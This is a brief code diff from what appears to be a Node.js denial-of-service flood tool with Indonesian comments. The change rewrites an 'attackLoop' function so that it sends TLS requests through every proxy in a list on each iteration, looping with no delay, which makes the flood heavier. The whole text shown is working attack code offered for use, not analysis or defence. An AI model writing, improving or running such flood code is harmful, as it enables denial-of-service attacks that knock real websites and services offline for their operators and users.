@@ -79,9 +79,10 @@ if (cluster.isMaster) {
     }
 
     function attackLoop() {
-        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
-        sendTLSRequest(proxy);
-        setImmediate(attackLoop); // Tidak ada delay, langsung loop lagi
+        proxies.forEach(proxy => {
+            sendTLSRequest(proxy); // Mengirim permintaan dengan setiap proxy tanpa delay
+        });
+        setImmediate(attackLoop); // Loop tanpa delay
     }
 
     attackLoop(); // Jalankan serangan tanpa delay
